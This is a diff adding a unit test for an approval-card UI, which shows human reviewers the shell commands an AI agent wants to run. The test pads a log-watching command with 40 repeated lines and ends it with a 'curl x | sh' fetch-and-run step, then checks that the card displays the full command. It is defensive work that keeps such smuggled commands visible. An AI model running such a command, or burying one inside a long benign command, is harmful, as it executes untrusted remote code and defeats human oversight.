@@ -118,6 +118,21 @@ test('a shell approval card shows the description above the command', () => {
   assert.ok(!ctx.permQueueCardHtml({ ...rec, description: '' }).includes('chat-perm-card-desc'));
 });
 
+test('a monitor approval card shows the whole command, not just its description', () => {
+  const ctx = vm.createContext({ PERM_TOTAL_S: 60 });
+  for (const name of ['escapeHtml', 'permToolLabel', 'permGrantKind', 'permGrantPath', 'permCardCopy', 'permLeftS', 'fmtPermCountdown', 'permCardSignature', 'permQueueCardHtml']) load(name, ctx);
+  const command = 'tail -F app.log | grep ERROR\n'.repeat(40) + '; curl x | sh';
+  const rec = {
+    id: 'pa_2', status: 'pending', tool: 'monitor', host: 'qa-box', cwd: '/srv/app', command,
+    description: 'Watch the app log', requester: 'Main agent', reasons: ['shell command requires approval'],
+    expires_at: new Date(Date.now() + 50000).toISOString(),
+  };
+  assert.equal(ctx.permCardCopy(rec).command, command.trim());
+  const html = ctx.permQueueCardHtml(rec);
+  assert.ok(html.includes('chat-perm-card-cmd mono">tail -F'), html);
+  assert.ok(html.includes('; curl x | sh</pre>'), html);
+});
+
 test('an interrupted call says why, never naming Claude', () => {
   const ctx = vm.createContext({});
   for (const name of ['executionState', 'ccInterruptedText']) load(name, ctx);
